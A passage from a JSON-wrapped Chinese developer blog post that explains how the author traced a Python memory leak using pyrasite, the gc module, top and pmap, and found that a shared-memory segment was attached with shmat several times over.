/proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure></p>\n<p>也可以通过设置<code>/etc/sysctl.d/10-ptrace.conf</code>中ptrace_scope为0来永久修改</p>\n<p>我们主要用到的是pyrasite-shell和pyrasite-memory-viewer。其中pyrasite-shell的用法如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ pyrasite-shell</span><br><span class=\"line\">Usage: pyrasite-shell &lt;PID&gt;</span><br></pre></td></tr></table></figure></p>\n<p>输入相应Python进程的pid，得到一个shell与其进行交互，这个shell类似ipython。我们首先让存在内存泄漏问题的Python脚本运行起来，然后用pyrasite-shell getshell，就可以输入一些命令观察结果，从而定位问题。<br>pyrasite-memory-viewer则需首先安装urwid和meliae：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(sudo) pip install urwid meliae</span><br><span class=\"line\"></span><br><span class=\"line\">$ pyrasite-memory-viewer &lt;PID&gt;</span><br></pre></td></tr></table></figure></p>\n<p>界面会列出当前对象内存占用的统计，按占用大小排序，包含对象的数量、总大小、百分比、对象类型名等信息，点选单个对象后将打印出对象的内容</p>\n<hr>\n<p>0x02  调试过程</p>\n<p>首先将我们的Python程序运行起来，然后用pyrasite-shell注入。<br>首先用gc模块的相关方法查看是否是垃圾回收的问题<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Connected to &apos;python xxx.py&apos;</span><br><span class=\"line\">Python 2.7.12 (default, Dec  4 2017, 14:50:18) </span><br><span class=\"line\">[GCC 5.4.0 20160609] on linux2</span><br><span class=\"line\">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class=\"line\">(DistantInteractiveConsole)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; import gc</span><br><span class=\"line\">&gt;&gt;&gt; gc.isenabled()</span><br><span class=\"line\">True</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; gc.garbage</span><br><span class=\"line\">[&lt;PtraceProcess #15277&gt;, &lt;PtraceProcess #15282&gt;, &lt;PtraceProcess #15287&gt;, &lt;PtraceProcess #15292&gt;, &lt;PtraceProcess #15297&gt;, &lt;PtraceProcess #15302&gt;, </span><br><span class=\"line\">&lt;PtraceProcess #15307&gt;, &lt;PtraceProcess #15312&gt;, &lt;PtraceProcess #15317&gt;,  .......</span><br></pre></td></tr></table></figure></p>\n<p>说明垃圾回收已开启，但多执行几次gc.garbage，发现这个叫做PtraceProcess的对象的数量在不断增加。实际上，这个对象是第三方python-ptrace模块中所定义的，查看其源码。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def __del__(self):</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            self.detach()</span><br><span class=\"line\">        except PtraceError:</span><br><span class=\"line\">            pass</span><br></pre></td></tr></table></figure></p>\n<p>果然定义了<code>__del__()</code>方法，这里可以使用objgraph模块作出此对象的循环引用图，从而直观的判断到底是哪里出现问题。具体安装和使用方法并不复杂，这里不再赘述，只给出样例图。<br><img src=\"https://i.imgur.com/zkbTrwr.png\" alt></p>\n<p>但是，在我将PtraceProcess的<code>__del__()</code>方法注释掉之后，问题仍然存在。这令我有些费解，这时想到去研究一下linux自带的top命令。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">top - 13:24:30 up 2 days, 11:37,  1 user,  load average: 0.54, 0.82, 0.93</span><br><span class=\"line\">Tasks: 286 total,   1 running, 285 sleeping,   0 stopped,   0 zombie</span><br><span class=\"line\">%Cpu(s):  6.1 us,  5.8 sy,  0.0 ni, 87.7 id,  0.1 wa,  0.0 hi,  0.3 si,  0.0 st</span><br><span class=\"line\">KiB Mem :  4016440 total,   249140 free,  2123672 used,  1643628 buff/cache</span><br><span class=\"line\">KiB Swap:  4192252 total,  4175600 free,    16652 used.  1304868 avail Mem </span><br><span class=\"line\"></span><br><span class=\"line\">   PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                           </span><br><span class=\"line\"> 32514 liwc      20   0  247852  52012   7468 S  69.1  1.3   0:08.44 python</span><br></pre></td></tr></table></figure></p>\n<p>可以看到%MEM、VIRT、RES、SHR这几项都在不断地增大，其中%MEM顾名思义就是内存的占用量，而VIRT是进程使用的虚拟内存总量、RES是进程使用的、未被换出的物理内存大小，SHR是以共享方式使用的内存大小。因为项目代码使用了用shmget申请的共享内存，所以我格外关注SHR的含义。通过查找资料得知，SHR包括：</p>\n<blockquote>\n<p>程序的代码段<br>动态库的代码段<br>通过mmap做的文件映射<br>通过mmap做的匿名映射，但指明了MAP_SHARED属性<br>通过shmget申请的共享内存</p>\n</blockquote>\n<p>在大佬的提示下，又发现内存增长的总量全部来自于SHR部分，这不禁使我怀疑是该部分代码有问题。使用pmap指令查看进程的内存映射关系:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">97523:   python xxx.py</span><br><span class=\"line\">0000000000400000   2936K r-x-- python2.7</span><br><span class=\"line\">00000000008dd000      4K r---- python2.7</span><br><span class=\"line\">00000000008de000    476K rw--- python2.7</span><br><span class=\"line\">0000000000955000    140K rw---   [ anon ]</span><br><span class=\"line\">0000000000b7a000  33564K rw---   [ anon ]</span><br><span class=\"line\">00007f6465c10000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">00007f6465c20000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">00007f6465c30000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">...</span><br><span class=\"line\">00007f6479e93000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">00007f6479ea3000      4K -----   [ anon ]</span><br><span class=\"line\">00007f6479ea4000   8192K rw---   [ anon ]</span><br><span class=\"line\">...</span><br><span class=\"line\"> total           447084K</span><br></pre></td></tr></table></figure></p>\n<p>发现同一块用shmget申请的共享内存被映射到进程空间内数次，看来这个就是吃掉内存的元凶。事实上，就是shmat函数被错误地调用了多次，从而被映射了多次。修正代码后，问题解决。</p>\n<hr>\n<p>0x03  问题总结</p>\n<p>总之，感觉出现疑似内存泄漏时，应该首先用pyrasite-shell连上看一下，排除循环引用等垃圾回收的问题，同时注意观察pmap、top等命令的结果。</p>\n","text":"0x00  问题引入<br>虽然Python本身有垃圾回收机制，但是也有内存泄露的可能。这里我对这次调试项目代码的经验作简单总结，予以参考。一般来说，可能出现内存泄露的情况，有如下几种：<br>1.对象被全局变量所引用，而生命周期较长<br>2.gc被禁用，使用gc.disabl","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"Dev","slug":"Dev","count":2,"path":"api/tags/Dev.json"}]}]}